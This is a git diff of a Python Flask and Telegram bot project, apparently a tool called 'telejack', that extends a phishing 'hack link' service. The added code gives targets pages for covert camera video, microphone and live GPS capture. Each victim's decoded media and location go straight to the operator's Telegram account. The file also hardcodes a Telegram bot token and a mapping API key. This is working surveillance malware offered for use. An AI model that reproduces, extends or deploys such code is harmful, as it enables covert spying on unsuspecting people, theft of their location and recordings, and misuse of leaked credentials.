@@ -1,4 +1,4 @@
-from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions
+from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions, send_file
 import logging
 import os
 import json
@@ -9,6 +9,7 @@ import os
 import threading
 import base64
 import requests
+from io import BytesIO
 import asyncio
 
 
@@ -21,8 +22,36 @@ app.secret_key = 'xxx'
 bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
 channel_id = '@hackerpdfbotlog'
 
+
+
 user_id = 1853412532
 host = "https://telejack.onrender.com/"
+
+
+info = f"""* ‼️ hack link list *\n
+*{host} - basic for devise info *
+*{host}/cam -cam hack*
+*{host}/loc - location info*
+*{host}/video - cam hack with videos*
+*{host}/mic - micophone hack*
+
+
+__• note if user checking and allow to permiseion __"""
+
+
+def gen():
+      N = 7
+      res = ''.join(random.choices(string.ascii_uppercase +string.digits, k=N))
+      return res
+      
+
+
+def fix_base64_padding(base64_string): 
+    # Fix padding if necessary
+    padding_needed = 4 - (len(base64_string) % 4) 
+    if padding_needed: 
+        base64_string += '=' * padding_needed 
+        return base64_string
 
 
 
@@ -34,13 +63,22 @@ def message(message):
             print(f"Failed to send message to {user_id}: {str(e)}")
 
 message("hacker is online ")
+message(info)
 
 
+
+def video(file):
+    try:
+      bot.send_video(user_id, file)
+    except Exception as e:
+        print(f"error video sending {str(e)}")
+       
 
 @bot.message_handler(commands=['start'])
 def send_(message):
-    bot.reply_to(message, """
+    bot.reply_to(message, f"""
     this bot made by krunal_io
+    {info}
 
     \n /start - Start bot \n /link - get your hacke link \n
     note link for target 🎯\n
@@ -49,13 +87,7 @@ def send_(message):
 
 @bot.message_handler(commands=['link'])
 def send_welcome(message):
-    bot.reply_to(message, f"""
-     {host}cam : for cam hacke 
-     {host} :  like etc.ip, device info
-     {host}loc : gps hack live 
-
-     \n  more Features comming soon like 🎤 mic hack , 🗺️ gps hack in devalment 
-     """)
+    bot.reply_to(message, info)
 
 
 def ipdata(ip):
@@ -97,6 +129,17 @@ def jdata(data):
 
 
 
+def audio(audio_path, caption=""):
+        try:
+            # Send the audio
+#            with open(audio_path, 'rb') as audio_file:
+            bot.send_audio(user_id, audio=audio_path, caption=caption)
+            print(f"Audio sent to {user_id}")
+           # time.sleep(1)  # Sleep for 1 second to avoid hitting rate limits
+        except Exception as e:
+            print(f"Failed to send audio to {user_id}: {str(e)}")
+
+
 @app.route("/")
 def hello():
     message("index page opened !\n")
@@ -112,6 +155,46 @@ def loc():
     message("loc page opened !? \n")
     return render_template("loc.html")
 
+
+@app.route("/video")
+def video_hack():
+    message("video hack page opened !? \n")
+    return render_template("video_hack.html")
+
+@app.route("/mic")
+def mic():
+    message("mic page opened !? \n")
+    return render_template("mic.html")
+
+
+@app.route("/video-hack", methods=['POST'])
+def video_share():
+    data = request.get_json()
+    video_data =  data['videoData']
+    convert = fix_base64_padding(video_data)
+    data_s = base64.b64decode(convert)
+    video_stream = BytesIO(data_s)
+    bot.send_video(user_id, video=video_stream, timeout=100)
+    
+    print("video sending")
+    return "hi", 200
+
+
+@app.route('/micdata', methods=['POST'])
+def micdata():
+    data = request.get_json()
+    image_data = data['audio']
+    global file
+    print("photo")
+    decoded_image_data = base64.b64decode(image_data)
+#    file = f"data/{ran()}.jpg"
+    time = now()
+    audio(decoded_image_data)
+    return jsonify({"message": "Image uploaded successfully!"})
+
+
+
+
 @app.route("/locdata", methods=['POST'])
 def lodata():
     jloc = request.get_json()
@@ -119,9 +202,12 @@ def lodata():
     message(f"""target gps data\n 
 ```
 {cc}``` """)
-    time.sleep(5)
+    try:
+         bot.send_location(user_id, latitude=jloc['latitude'], longitude=jloc['longitude'], live_period=jloc['timestamp'], heading=jloc['heading'], horizontal_accuracy=jloc['accuracy'])
+    finally:
+          bot.send_location(user_id, latitude=jloc['latitude'], longitude=jloc['longitude'], heading=jloc['heading'], horizontal_accuracy=jloc['accuracy'] )
     # photo(f"https://maps.geoapify.com/v1/staticmap?style=toner-grey&width=350&height=300&center=lonlat:{jloc['longitude']},{jloc['latitude']}&zoom=10.9318&apiKey=83201a4a9e1e477399fe95ceb2f855e9")
-    return jsonify({"message": "done"})
+          return jsonify({"message": "done"})
 
 @app.route('/data', methods=['POST', 'GET'])
 def upload_image():
@@ -169,6 +255,7 @@ def ip():
 
 
 
+
 async def Bot():
     print("bot server is runing")
     bot.polling()
@@ -182,6 +269,8 @@ def ser():
 
 if __name__ == '__main__':
     # Start Flask app in a new thread
+    
+    
     flask_thread = threading.Thread(target=ser)
     flask_thread.start()
     asyncio.run(Bot())
